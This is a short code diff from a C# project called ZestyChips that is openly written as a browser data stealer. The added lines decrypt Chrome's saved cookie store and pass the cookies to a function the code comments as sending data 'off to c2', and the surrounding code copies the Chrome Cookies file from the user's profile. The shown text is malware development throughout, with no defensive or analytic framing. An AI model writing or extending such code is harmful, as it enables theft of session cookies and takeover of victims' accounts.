@@ -19,8 +19,6 @@ namespace ZestyChips
         */
         public static void Start()
         {
-            Program.SendBase64EncodedData("Hello from the stealer!"); // test case success
-
             // steal chrome data
             string chromeData = Chrome();
             Helpers.PrintSuccess($"found chrome data: {chromeData}");
@@ -39,6 +37,7 @@ namespace ZestyChips
             } else {
                 Helpers.PrintInfo("Chrome found, copying..");
                 for(;;) {
+                    // steal chrome cookies
                     try {
                         // copy file to dest file name cc
                         // Helpers.PrintInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
@@ -52,7 +51,9 @@ namespace ZestyChips
                     }
                 }
 
-                return DecryptChromeVault("cc");
+                string cookies = DecryptChromeVault("cc");
+                Program.SendBase64EncodedData(cookies); // send data off to c2
+                return cookies;
         }
     }
         private static string DecryptChromeVault(string dataSourceFile) {
